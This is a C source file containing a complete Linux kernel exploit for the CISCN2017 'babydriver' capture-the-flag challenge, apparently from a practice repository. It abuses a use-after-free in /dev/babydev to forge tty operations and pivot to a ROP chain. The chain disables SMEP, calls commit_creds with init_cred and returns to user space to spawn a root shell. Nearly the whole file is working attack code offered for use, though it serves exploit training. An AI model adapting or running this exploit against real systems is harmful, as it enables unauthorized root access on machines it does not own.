/* https://github.com/pr0cf5/kernel-exploit-practice/tree/master/babydriver */
// CISCN2017 babydriver(ROP)
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// gcc -static exp_rop.c -o exp_rop -g -masm=intel

#define DEV                               "/dev/babydev"
#define ALLOC_SIZE                        0x2e0

#define BASE_PTM_UNIX98_OPS               0xffffffff81a74f80
#define INIT_CRED                         0xffffffff81e48c60

#define PREPARE_KERNEL_CRED               0xffffffff810a1810
#define COMMIT_CREDS                      0xffffffff810a1420

#define POP_RSP_RET                       0xffffffff81171045
#define POP_RDI_RET                       0xffffffff810d238d
#define MOV_CR4_RDI_POP_RBP_RET           0xffffffff81004d80
#define SWAPGS_POP_RBP_RET                0xffffffff81063694
#define IRETQ                             0xffffffff8181a797
#define XCHG_EAX_ESP_ADD_AL_0_POP_RBP_RET 0xffffffff8114ae51


struct tty_operations {
    void * (*lookup)(void);
    int  (*install)();
    void (*remove)();
    int  (*open)();
    void (*close)();
    void (*shutdown)();
    void (*cleanup)();
    int  (*write)(void *tty, const unsigned char *buf, int count);
    int  (*put_char)(void *tty, unsigned char ch);
    void (*flush_chars)(void *tty);
    int  (*write_room)(void *tty);
    int  (*chars_in_buffer)(void *tty);
    int  (*ioctl)(void *tty, unsigned int cmd, unsigned long arg);
    // . . .
};


/* used for stack pivoting to the userspace */
struct tty_operations forged_ops = {
    .close = (void (*) ())XCHG_EAX_ESP_ADD_AL_0_POP_RBP_RET
};


unsigned long user_cs;
unsigned long user_ss;
unsigned long user_sp;
unsigned long user_rflags;


/* https://www.anquanke.com/post/id/259252 */
void saveStatus()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    printf("[*] Status has been saved.\n");
}


void shell()
{
    printf("[*] executing shell...\n");
    system("/bin/sh");
}


void privesc()
{
    int (*comcred)() = (int (*)())COMMIT_CREDS;
    comcred(INIT_CRED);
}


void alloc_forged_kernel_stack()
{
    int i = 0;
    unsigned long long *rop;
    char *tmp = mmap((void *)(XCHG_EAX_ESP_ADD_AL_0_POP_RBP_RET & 0xffff0000),
                      0x10000,
                      PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS,
                      -1, 0);
    if (tmp == MAP_FAILED) {
        perror("mmap");
        exit(1);
    }

    printf("[+] mmap()ed at %p\n", tmp);

    /* well for some reason i failed to find a "xchg rax, rsp" gadget (with
     * neither ropper nor ROPgadget, neither in vmlinux nor in in-memory
     * image of it...), which would make pwning a bit easier due to no need
     * of mmap() that is used to match the address while stack pivoting...   */

    /* starts at 0x8114ae51 (XCHG_EAX_ESP_ADD_AL_0_POP_RBP_RET & 0xffffffff) */
    rop = (unsigned long long *)(tmp + 0xae51);

    rop[i++] = 0xDEADD34DDEADD34D;
    /* disable smep (CR4's 20th bit) */
    rop[i++] = POP_RDI_RET;
    rop[i++] = 0x6f0;
    rop[i++] = MOV_CR4_RDI_POP_RBP_RET;

    /* <hmm>now jump to some userspace code or continue ropping?..</hmm>     */
    rop[i++] = POP_RDI_RET;
    rop[i++] = (unsigned long long)privesc;

    /* ret to userspace gracefully (though... won't the kernel
     * eventually crash once the mapping gets unmapped on exploit exit?..)   */
    rop[i++] = SWAPGS_POP_RBP_RET;
    rop[i++] = 0x1020304050607080;
    rop[i++] = IRETQ;
    rop[i++] = (unsigned long long)shell;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    printf("[+] Placed ROP at %p\n", rop);
}


int main()
{
    int fd0, fd1, ptmx, i;
    char buf[ALLOC_SIZE];

    saveStatus();
    alloc_forged_kernel_stack();

    fd0 = open(DEV, O_RDWR);
    fd1 = open(DEV, O_RDWR);

    /* ~ sizeof(struct tty_struct) */
    ioctl(fd0, 0x10001, ALLOC_SIZE);

    /* UAF via fd1 */
    close(fd0);

    ptmx = open("/dev/ptmx", O_RDWR);

    read(fd1, buf, ALLOC_SIZE - 1);
//     for (i = 0; i < 128; i += 8)
//         printf("%llx\n", *(long long *)(buf + i) );

    /* set pty_ops to point to the forged struct (&close()) */
    *(unsigned long long *)(buf + 8*3) = (unsigned long long)&forged_ops;
    write(fd1, buf, 8*4);
//     perror("write");

    printf("[+] Rewritten ops to &forged_ops %p\n", &forged_ops);

    printf("[*] Calling close() on ptmx...\n");

    /* trigger */
    close(ptmx);

    return 0;
}
